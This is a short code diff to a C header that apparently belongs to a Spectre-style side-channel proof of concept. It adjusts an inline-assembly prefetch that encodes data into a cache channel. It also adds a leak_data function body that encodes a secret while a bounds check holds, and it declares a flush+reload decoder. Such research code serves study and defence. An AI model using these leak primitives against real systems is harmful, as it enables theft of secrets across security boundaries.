@@ -57,7 +57,7 @@ static inline __always_inline void asm_encode_load_array_index(
                      "movq %[data], %%rax\n"
                      "andq %%rcx, %%rax\n"
                      "imulq %%rdx, %%rax\n"
-                     "prefetcht0 (%[channel], %%rax, 1)\n"
+                     "prefetcht0 (%[channel], %%rax)\n"
                      :
                      : [data] "r"(data), [channel] "r"(channel+stride), [stride] "r"(stride), [bitscount] "r"(bits_count)
                      : "rax", "rbx", "rcx", "rdx", "rsi", "cc");
@@ -93,11 +93,19 @@ static inline __always_inline void asm_encode_flush_bitwise(
 }
 
 // returns true during the training phase, false if encoding can only happen transiently
-bool leak_data(void (*asm_encode)(uint64_t data, uint8_t *channel,
+inline __always_inline bool leak_data(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                   uint8_t bits_count, uint64_t stride),
                uint32_t iteration, uint32_t *train_data,
                uint32_t train_data_len, uint64_t secret, uint8_t channel[],
-               uint8_t bits_count, uint64_t stride);
+               uint8_t bits_count, uint64_t stride)
+{
+    if (train_data[iteration] < train_data_len)
+    {
+        asm_encode(secret, channel, bits_count, stride);
+        return true;
+    }
+    return false;
+}
 
 uint64_t decode_flush_reload_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold);
 
